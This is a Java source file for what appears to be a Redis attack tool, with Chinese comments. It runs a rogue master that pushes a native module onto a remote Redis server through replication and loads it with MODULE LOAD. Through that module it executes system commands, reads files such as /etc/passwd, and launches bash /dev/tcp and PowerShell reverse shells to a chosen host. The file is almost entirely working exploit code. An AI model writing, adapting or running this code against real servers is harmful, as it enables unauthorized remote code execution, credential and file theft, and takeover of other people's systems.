package database;

import redis.clients.jedis.Jedis;
import redis.clients.jedis.HostAndPort;
import redis.clients.jedis.DefaultJedisClientConfig;
import redis.clients.jedis.params.ScanParams;
import redis.clients.jedis.resps.ScanResult;

import java.io.IOException;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.*;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.Collections;
import java.util.Base64;

public class redis {

    private final String host;
    private final int port;
    private final String password;
    private Jedis jedis;
    private static final int CHUNK_SIZE = 2048;

    public redis(String host, String port, String database, String username, String password) {
        this.host = host;
        this.port = Integer.parseInt(port);
        this.password = (password == null) ? "" : password;
        connect();
    }

    private void connect() {
        if (jedis != null) return;
        DefaultJedisClientConfig cfg = DefaultJedisClientConfig.builder()
                .password((password == null || password.isEmpty()) ? null : password)
                .build();
        jedis = new Jedis(new HostAndPort(host, port), cfg);
    }

    public void close() {
        try {
            if (jedis != null) jedis.close();
        } catch (Exception ignored) {
        }
    }

    public boolean testConnection() {
        DefaultJedisClientConfig cfg = DefaultJedisClientConfig.builder()
                .password((password == null || password.isEmpty()) ? null : password)
                .build();
        try (Jedis tmp = new Jedis(new HostAndPort(host, port), cfg)) {
            String pong = tmp.ping();
            return pong != null && pong.toLowerCase().contains("pong");
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public String getDatabaseInfo() {
        try {
            StringBuilder sb = new StringBuilder();
            try {
                String pong = jedis.ping();
                if (pong != null && !pong.isEmpty()) {
                    sb.append("[+] Ping: ").append(pong).append("\n");
                }
            } catch (Exception ignored) {
            }

            sb.append("[+] Connected: ").append(host).append(":").append(port).append("\n");
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }

    /**
     * 自动判断系统类型并将内置模块写入临时目录，然后 MODULE LOAD。
     * 首选资源路径（统一命名）：/redis/modules/redis.dll（Windows）或 /redis/modules/redis.so（Linux/macOS）。
     * 若未找到，则回退到旧结构：/redis/modules/{windows|linux|mac}/{32|64}/。
     */
    public String autoLoadModuleFromResources() {
        try {
            String osKey = detectOSKeyFromRedis();
            String bits = detectBitsFromRedis();

            String resourceDir = "/redis/" + osKey + "/" + bits + "/";
            String expectedName;
            switch (osKey) {
                case "windows" -> expectedName = "redis.dll";
                case "mac" -> expectedName = "redis.dylib";
                default -> expectedName = "redis.so";
            }
            String candidatePath = resourceDir + expectedName;

            String resourcePath;
            try (InputStream check = redis.class.getResourceAsStream(candidatePath)) {
                if (check != null) {
                    resourcePath = candidatePath;
                } else {
                    resourcePath = getSingleFileResourcePath(resourceDir);
                    if (resourcePath == null) {
                        return "[!] 未找到模块资源文件: " + candidatePath + " 或目录: " + resourceDir;
                    }
                }
            }

            String serverInfo = String.format("[i] Server OS: %s, arch_bits: %s", osKey, bits);
            String targetPath = getTempPathForOS(osKey, resourcePath);
            try (InputStream is = redis.class.getResourceAsStream(resourcePath)) {
                if (is == null) return "[!] 资源读取失败: " + resourcePath;
                if (isServerLocal()) {
                    writeStreamToFile(is, Paths.get(targetPath));
                } else {
                    String sep = "windows".equals(osKey) ? "\\" : "/";
                    String targetDir = targetPath.substring(0, Math.max(targetPath.lastIndexOf(sep), 0));
                    String targetName = targetPath.substring(targetPath.lastIndexOf(sep) + 1);
                    byte[] payload = is.readAllBytes();
                    String pushRes = pushModuleViaReplication(payload, targetDir, targetName);
                    if (pushRes.startsWith("[!]")) {
                        return serverInfo + "\n[i] 使用资源: " + resourcePath + "\n" + pushRes;
                    }
                    targetPath = pushRes;
                }
            }

            String loadResult;
            if (isModuleFileName(targetPath)) {
                loadResult = moduleLoad(targetPath);
            } else {
                loadResult = "[!] 无法加载模块：当前写入文件名为 '" + targetPath + "'，非模块扩展名。\n" +
                        "[>] 说明：由于 'dbfilename' 受保护无法修改，只能写入到现有 RDB 文件名。\n" +
                        "[>] 解决方案：临时允许修改 'dbfilename' 或在配置中预设为模块文件名（.so/.dll/.dylib），再重试。";
            }
            return serverInfo + "\n[i] 使用资源: " + resourcePath + "\n[i] 模块目标路径: " + targetPath + "\n" + loadResult;
        } catch (Exception e) {
            return "[!] 自动加载失败: " + e.getMessage();
        }
    }

    private static boolean isModuleFileName(String path) {
        if (path == null) return false;
        String p = path.toLowerCase();
        return p.endsWith(".so") || p.endsWith(".dll") || p.endsWith(".dylib");
    }

    private String pushModuleViaReplication(byte[] moduleBytes, String targetDir, String targetName) {
        try {
            String sep = targetDir.contains("\\") ? "\\" : "/";
            if (!targetDir.endsWith(sep)) targetDir += sep;

            String effectiveName = targetName;
            try {
                jedis.configSet("dbfilename", targetName);
            } catch (Exception eDb) {
                String currentName = getConfigValue("dbfilename");
                if (currentName == null || currentName.isEmpty()) {
                    return "[!] 无法设置或读取 dbfilename（受保护或被 ACL 拦截），无法确定投送文件名: " + eDb.getMessage();
                }
                effectiveName = currentName;
            }

            String effectiveDir = targetDir;
            try {
                jedis.configSet("dir", targetDir);
            } catch (Exception eDir) {
                try {
                    String currentDir = getConfigValue("dir");
                    if (currentDir != null && !currentDir.isEmpty()) {
                        effectiveDir = currentDir;
                        if (!effectiveDir.endsWith(sep)) effectiveDir += sep;
                    } else {
                        return "[!] CONFIG GET dir 失败，无法确定目标目录";
                    }
                } catch (Exception eGet) {
                    return "[!] CONFIG GET dir 异常: " + eGet.getMessage();
                }
            }

            byte[] rdbPayload = MinimalRDB.buildWithStringKV("turacos:module_blob", moduleBytes);
            RogueMaster master = new RogueMaster(rdbPayload);
            master.start();
            String localIp = getLocalIpPreferIPv4();
            int servePort = master.getPort();

            jedis.slaveof(localIp, servePort);
            boolean served = master.awaitServed(8000);
            jedis.slaveofNoOne();
            master.stop();

            if (!served) return "[!] 复制推送失败：未完成有效的 RDB 传输";
            return effectiveDir + effectiveName;
        } catch (Exception e) {
            return "[!] 复制投送异常: " + e.getMessage();
        }
    }

    /**
     * 构造“仅通过 Redis 原生命令”的投送方案（不主动执行），
     * 返回需要按顺序执行的命令列表，供你在外部逐条发送：
     * 1) CONFIG SET dir <tmp>
     * 2) CONFIG SET dbfilename <module_name>
     * 3) SET <key> "0x<hex>"
     * 4) SAVE
     * <p>
     * 重要说明：使用 SAVE 生成的文件是 RDB 快照格式，并非模块二进制原样文件；
     * 因此该方案通常不能直接作为 MODULE LOAD 的有效模块文件。
     * 若你的环境确实希望“返回命令”并外部执行，请结合复制投送或已加载的写文件模块来确保落盘为原始字节。
     */
    public List<String> buildSaveCommandsFromResource() {
        try {
            String osKey = detectOSKeyFromRedis();
            String bits = detectBitsFromRedis();
            String resourceDir = "/redis/" + osKey + "/" + bits + "/";
            String expectedName;
            if ("windows".equals(osKey)) {
                expectedName = "redis.dll";
            } else if ("mac".equals(osKey)) {
                expectedName = "redis.dylib";
            } else {
                expectedName = "redis.so";
            }
            String candidatePath = resourceDir + expectedName;

            String resourcePath;
            try (InputStream check = redis.class.getResourceAsStream(candidatePath)) {
                if (check != null) {
                    resourcePath = candidatePath;
                } else {
                    resourcePath = getSingleFileResourcePath(resourceDir);
                    if (resourcePath == null) {
                        return Collections.singletonList("[!] 未找到模块资源文件: " + candidatePath + " 或目录: " + resourceDir);
                    }
                }
            }

            String targetPath = getTempPathForOS(osKey, resourcePath);
            String sep = "windows".equals(osKey) ? "\\" : "/";
            String targetDir = targetPath.substring(0, Math.max(targetPath.lastIndexOf(sep), 0));
            String targetName = targetPath.substring(targetPath.lastIndexOf(sep) + 1);

            byte[] bytes;
            try (InputStream is = redis.class.getResourceAsStream(resourcePath)) {
                if (is == null) return Collections.singletonList("[!] 资源读取失败: " + resourcePath);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buf = new byte[4096];
                int r;
                while ((r = is.read(buf)) != -1) {
                    bos.write(buf, 0, r);
                }
                bytes = bos.toByteArray();
            }

            String hex = toHex(bytes);
            List<String> cmds = new ArrayList<>();
            cmds.add("CONFIG SET dir " + targetDir);
            cmds.add("CONFIG SET dbfilename " + targetName);
            cmds.add("SET turacos:module_hex \"0x" + hex + "\"");
            cmds.add("SAVE");
            return cmds;
        } catch (Exception e) {
            return Collections.singletonList("[!] 构造命令失败: " + e.getMessage());
        }
    }

    private static String toHex(byte[] data) {
        final char[] HEX = "0123456789abcdef".toCharArray();
        char[] out = new char[data.length * 2];
        for (int i = 0, j = 0; i < data.length; i++) {
            int v = data[i] & 0xFF;
            out[j++] = HEX[v >>> 4];
            out[j++] = HEX[v & 0x0F];
        }
        return new String(out);
    }

    private static String getLocalIpPreferIPv4() {
        try {
            Enumeration<NetworkInterface> nics = NetworkInterface.getNetworkInterfaces();
            while (nics.hasMoreElements()) {
                NetworkInterface nic = nics.nextElement();
                Enumeration<InetAddress> addrs = nic.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress addr = addrs.nextElement();
                    if (!addr.isLoopbackAddress() && addr instanceof java.net.Inet4Address) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {
        }
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            return "127.0.0.1";
        }
    }

    private String getConfigValue(String key) {
        try {
            List<String> list = (List<String>) jedis.configGet(key);
            if (list != null && list.size() >= 2 && key.equalsIgnoreCase(list.get(0))) {
                return list.get(1);
            }
        } catch (Exception ignored) {
        }
        try {
            List<String> all = (List<String>) jedis.configGet("*");
            if (all != null) {
                for (int i = 0; i + 1 < all.size(); i += 2) {
                    if (key.equalsIgnoreCase(all.get(i))) {
                        return all.get(i + 1);
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private static class RogueMaster {
        private final byte[] payload;
        private ServerSocket server;
        private volatile boolean served = false;
        private Thread thread;

        RogueMaster(byte[] payload) {
            this.payload = payload;
        }

        void start() throws IOException {
            server = new ServerSocket(0);
            thread = new Thread(() -> {
                try (Socket s = server.accept()) {
                    BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
                    OutputStream os = s.getOutputStream();
                    String line;
                    long deadline = System.currentTimeMillis() + 6000;
                    while (System.currentTimeMillis() < deadline && (line = br.readLine()) != null) {
                        if (line.startsWith("PING")) {
                            os.write("+PONG\r\n".getBytes());
                            os.flush();
                        } else if (line.startsWith("REPLCONF")) {
                            os.write("+OK\r\n".getBytes());
                            os.flush();
                        } else if (line.startsWith("PSYNC") || line.startsWith("SYNC")) {
                            os.write("+FULLRESYNC deadbeefcafebabe 1\r\n".getBytes());
                            os.write(("$" + payload.length + "\r\n").getBytes());
                            os.write(payload);
                            os.write("\r\n".getBytes());
                            os.flush();
                            served = true;
                            break;
                        }
                    }
                } catch (IOException ignored) {
                }
            }, "rogue-master");
            thread.setDaemon(true);
            thread.start();
        }

        int getPort() {
            return server.getLocalPort();
        }

        boolean awaitServed(long ms) {
            long t0 = System.currentTimeMillis();
            while (System.currentTimeMillis() - t0 < ms) {
                if (served) return true;
                try {
                    Thread.sleep(100);
                } catch (InterruptedException ignored) {
                }
            }
            return served;
        }

        void stop() {
            try {
                if (server != null) server.close();
            } catch (IOException ignored) {
            }
        }
    }

    /**
     * 最小合法 RDB 构造器：生成 REDIS0009 格式的快照，包含一个 string 键值。
     * 用于复制协议传输，确保从库正确写入 RDB 文件。
     */
    private static class MinimalRDB {
        private static final byte[] HEADER = "REDIS0009".getBytes();
        private static final int OP_STRING = 0x00;
        private static final int OP_SELECTDB = 0xFE;
        private static final int OP_RESIZEDB = 0xFB;
        private static final int OP_EOF = 0xFF;

        private static final long POLY = 0xC96C5795D7870F42L;
        private static final long[] CRC_TABLE = buildCrcTable();

        static byte[] buildWithStringKV(String key, byte[] value) {
            try {
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                out.write(HEADER);

                out.write(OP_RESIZEDB);
                writeLen(out, 1);
                writeLen(out, 0);

                out.write(OP_SELECTDB);
                writeLen(out, 0);

                out.write(OP_STRING);
                byte[] k = key.getBytes("UTF-8");
                writeLen(out, k.length);
                out.write(k);
                writeLen(out, value.length);
                out.write(value);

                out.write(OP_EOF);

                byte[] noChecksum = out.toByteArray();
                long crc = crc64(noChecksum);
                out.write(new byte[]{
                        (byte) (crc & 0xFF),
                        (byte) ((crc >>> 8) & 0xFF),
                        (byte) ((crc >>> 16) & 0xFF),
                        (byte) ((crc >>> 24) & 0xFF),
                        (byte) ((crc >>> 32) & 0xFF),
                        (byte) ((crc >>> 40) & 0xFF),
                        (byte) ((crc >>> 48) & 0xFF),
                        (byte) ((crc >>> 56) & 0xFF)
                });
                return out.toByteArray();
            } catch (Exception e) {
                return HEADER;
            }
        }

        private static void writeLen(OutputStream os, int len) throws IOException {
            if (len < 64) {
                os.write(len & 0xFF);
            } else if (len < 16384) {
                int v = len | 0x4000;
                os.write((v >>> 8) & 0xFF);
                os.write(v & 0xFF);
            } else {
                os.write(0x80);
                os.write((len >>> 24) & 0xFF);
                os.write((len >>> 16) & 0xFF);
                os.write((len >>> 8) & 0xFF);
                os.write(len & 0xFF);
            }
        }

        private static long[] buildCrcTable() {
            long[] tbl = new long[256];
            for (int i = 0; i < 256; i++) {
                long crc = i;
                for (int j = 0; j < 8; j++) {
                    if ((crc & 1L) != 0) crc = (crc >>> 1) ^ POLY; else crc >>>= 1;
                }
                tbl[i] = crc;
            }
            return tbl;
        }

        private static long crc64(byte[] data) {
            long crc = 0;
            for (byte b : data) {
                int idx = ((int) crc ^ (b & 0xFF)) & 0xFF;
                crc = CRC_TABLE[idx] ^ (crc >>> 8);
            }
            return crc;
        }
    }

    private boolean isServerLocal() {
        try {
            InetAddress server = InetAddress.getByName(host);
            if (server.isLoopbackAddress() || server.isAnyLocalAddress()) return true;
            Enumeration<NetworkInterface> nics = NetworkInterface.getNetworkInterfaces();
            while (nics.hasMoreElements()) {
                NetworkInterface nic = nics.nextElement();
                Enumeration<InetAddress> addrs = nic.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress addr = addrs.nextElement();
                    if (addr.equals(server)) return true;
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    private String detectOSKeyFromRedis() {
        try {
            String info;
            try {
                info = jedis.info("server");
            } catch (Exception e) {
                info = jedis.info();
            }
            String osLine = null;
            for (String line : info.split("\r?\n")) {
                if (line.startsWith("os:")) {
                    osLine = line.substring(3).trim();
                    break;
                }
            }
            if (osLine != null) {
                String l = osLine.toLowerCase();
                if (l.contains("win")) return "windows";
                if (l.contains("mac") || l.contains("darwin")) return "mac";
                if (l.contains("linux")) return "linux";
            }
            String osName = System.getProperty("os.name", "").toLowerCase();
            if (osName.contains("win")) return "windows";
            if (osName.contains("mac") || osName.contains("darwin")) return "mac";
            return "linux";
        } catch (Exception e) {
            String osName = System.getProperty("os.name", "").toLowerCase();
            if (osName.contains("win")) return "windows";
            if (osName.contains("mac") || osName.contains("darwin")) return "mac";
            return "linux";
        }
    }

    private String detectBitsFromRedis() {
        try {
            String info;
            try {
                info = jedis.info("server");
            } catch (Exception e) {
                info = jedis.info();
            }
            String bitsLine = null;
            String osLine = null;
            for (String line : info.split("\r?\n")) {
                if (line.startsWith("arch_bits:")) {
                    bitsLine = line.substring("arch_bits:".length()).trim();
                }
                if (line.startsWith("os:")) {
                    osLine = line.substring(3).trim();
                }
            }
            if (bitsLine != null && (bitsLine.equals("32") || bitsLine.equals("64"))) return bitsLine;
            if (osLine != null) {
                String l = osLine.toLowerCase();
                if (l.contains("x86_64") || l.contains("64")) return "64";
                if (l.contains("x86") || l.contains("32")) return "32";
            }
            String bits = System.getProperty("sun.arch.data.model");
            if (bits != null && (bits.equals("32") || bits.equals("64"))) return bits;
            String arch = System.getProperty("os.arch", "").toLowerCase();
            if (arch.contains("64")) return "64";
            if (arch.contains("86")) return "32";
            return "64";
        } catch (Exception e) {
            String bits = System.getProperty("sun.arch.data.model");
            if (bits != null && (bits.equals("32") || bits.equals("64"))) return bits;
            String arch = System.getProperty("os.arch", "").toLowerCase();
            if (arch.contains("64")) return "64";
            if (arch.contains("86")) return "32";
            return "64";
        }
    }

    private static String getSingleFileResourcePath(String resourceDir) {
        try {
            String dir = resourceDir.endsWith("/") ? resourceDir.substring(0, resourceDir.length() - 1) : resourceDir;
            URL url = redis.class.getResource(dir);
            if (url == null) return null;

            if ("file".equals(url.getProtocol())) {
                Path path = Paths.get(url.toURI());
                try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) {
                    for (Path p : stream) {
                        if (Files.isRegularFile(p)) return dir + "/" + p.getFileName();
                    }
                }
                return null;
            } else if ("jar".equals(url.getProtocol())) {
                String jarPath = url.getPath().substring(5, url.getPath().indexOf("!"));
                try (JarFile jar = new JarFile(jarPath)) {
                    Enumeration<JarEntry> entries = jar.entries();
                    String prefix = dir.startsWith("/") ? dir.substring(1) + "/" : dir + "/";
                    while (entries.hasMoreElements()) {
                        JarEntry entry = entries.nextElement();
                        if (!entry.isDirectory() && entry.getName().startsWith(prefix)) {
                            return "/" + entry.getName();
                        }
                    }
                }
                return null;
            }
            return null;
        } catch (IOException | URISyntaxException e) {
            return null;
        }
    }

    private static String getTempPathForOS(String osKey, String resourcePath) {
        String fileName = resourcePath.substring(resourcePath.lastIndexOf('/') + 1);
        String base;
        String sep;
        switch (osKey) {
            case "windows" -> {
                base = "C:\\Windows\\Temp";
                sep = "\\";
            }
            case "linux", "mac" -> {
                base = "/tmp";
                sep = "/";
            }
            default -> {
                base = System.getProperty("java.io.tmpdir");
                sep = FileSystems.getDefault().getSeparator();
            }
        }
        if (!base.endsWith(sep)) base += sep;
        return base + fileName;
    }

    public List<String> getKeys(int limit) {
        try {
            ScanParams params = new ScanParams().count(Math.max(limit, 10));
            ScanResult<String> res = jedis.scan("0", params);
            return res != null ? res.getResult() : List.of();
        } catch (Exception e) {
            return List.of();
        }
    }

    public List<String> getKeyPreview(String key) {
        try {
            String type = jedis.type(key);
            List<String> out = new ArrayList<>();
            out.add("type=" + type);
            switch (type) {
                case "string" -> {
                    String v = jedis.get(key);
                    out.add(v != null ? v : "(nil)");
                }
                case "list" -> out.addAll(jedis.lrange(key, 0, 100));
                case "set" -> out.addAll(jedis.smembers(key));
                case "hash" -> jedis.hgetAll(key).forEach((k, v) -> out.add(k + "=" + v));
                case "zset" ->
                        jedis.zrangeWithScores(key, 0, 100).forEach(t -> out.add(t.getElement() + ":" + t.getScore()));
                default -> out.add("(unsupported type)");
            }
            return out;
        } catch (Exception e) {
            return List.of("读取失败: " + e.getMessage());
        }
    }

    private static void writeStreamToFile(InputStream is, Path outPath) throws IOException {
        Files.createDirectories(outPath.getParent());
        try (var os = Files.newOutputStream(outPath, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)) {
            byte[] buf = new byte[CHUNK_SIZE];
            int len;
            while ((len = is.read(buf)) != -1) {
                os.write(buf, 0, len);
            }
        }
    }

    public String moduleLoad(String modulePath) {
        try {
            try {
                String lua = "return redis.call('MODULE','LOAD',ARGV[1])";
                Object res = jedis.eval(lua, Collections.emptyList(), Collections.singletonList(modulePath));
                return "[+] MODULE LOAD 成功: " + String.valueOf(res);
            } catch (Exception ignored) {
            }

            try {
                String lua2 = "return redis.call('MODULE','LOAD',ARGV[1])";
                Object res2 = jedis.eval(lua2, Collections.emptyList(), Collections.singletonList(modulePath));
                return "[+] MODULE LOAD 成功: " + String.valueOf(res2);
            } catch (Exception e2) {
                return "[!] MODULE LOAD 失败: " + e2.getMessage() + "\n[!] 若 Redis 非本机，模块文件需存在于服务器路径: " + modulePath;
            }
        } catch (Exception e) {
            return "[!] MODULE LOAD 执行异常: " + e.getMessage();
        }
    }

    /**
     * 通过模块执行系统命令，尝试多候选命令名（system.exec/sys.exec/exec）。
     */
    public String exCmd(String type, String cmd) {
        if (cmd == null || cmd.isEmpty()) cmd = "whoami";
        try {
            if (!"MODULE".equalsIgnoreCase(type) && !"LUA".equalsIgnoreCase(type)) {
                return "[!] 不支持的方式: " + type;
            }

            String[] candidates = {"system.exec", "sys.exec", "exec"};
            for (String fn : candidates) {
                try {
                    String script = "return redis.call('" + fn + "', ARGV[1])";
                    Object res = jedis.eval(script, Collections.emptyList(), Collections.singletonList(cmd));
                    if (res != null) return String.valueOf(res);
                } catch (Exception ignored) {
                }
            }
            return "[!] 未找到可用的模块命令用于执行: system.exec/sys.exec/exec";
        } catch (Exception e) {
            return "[!] 执行失败: " + e.getMessage();
        }
    }

    /**
     * 通过模块读取文件，尝试多候选命令名（system.read/sys.read/read）。
     */
    public String readFiles(String path, String type) {
        if (path == null || path.trim().isEmpty()) path = "/etc/passwd";
        path = path.trim();
        try {
            if ("LUA".equalsIgnoreCase(type)) {
                String lua = "local f = io.open(ARGV[1],'rb'); if not f then return '[!] 无法打开文件: '..ARGV[1] end; local c=f:read('*a'); f:close(); return c";
                try {
                    Object res = jedis.eval(lua, Collections.emptyList(), Collections.singletonList(path));
                    return res == null ? "" : String.valueOf(res);
                } catch (Exception eLua) {
                    return "[!] LUA 读取失败: " + eLua.getMessage();
                }
            }

            String[] candidates = {"system.read", "sys.read", "read"};
            for (String fn : candidates) {
                try {
                    String script = "return redis.call('" + fn + "', ARGV[1])";
                    Object res = jedis.eval(script, Collections.emptyList(), Collections.singletonList(path));
                    if (res != null) return String.valueOf(res);
                } catch (Exception ignored) {
                }
            }

            return "[!] 未找到可用的模块命令用于读取: system.read/sys.read/read\n" +
                   "[>] 可能原因：未加载写文件/读文件模块，或被 ACL 拦截\n" +
                   "[>] 建议：先加载模块，或改用 LUA 方式进行读取";
        } catch (Exception e) {
            return "[!] 读取失败: " + e.getMessage();
        }
    }

    public void reverseShell(String host, int port) {
        List<String> cmds = new ArrayList<>();
        cmds.add("bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
        cmds.add("/bin/bash -c 'bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1'");
        cmds.add("powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"");

        for (String c : cmds) {
            String[] candidates = {"system.exec", "sys.exec", "exec"};
            for (String fn : candidates) {
                try {
                    String script = "return redis.call('" + fn + "', ARGV[1])";
                    Object res = jedis.eval(script, Collections.emptyList(), Collections.singletonList(c));
                    if (res != null) break;
                } catch (Exception ignored) {
                }
            }
        }
    }
}
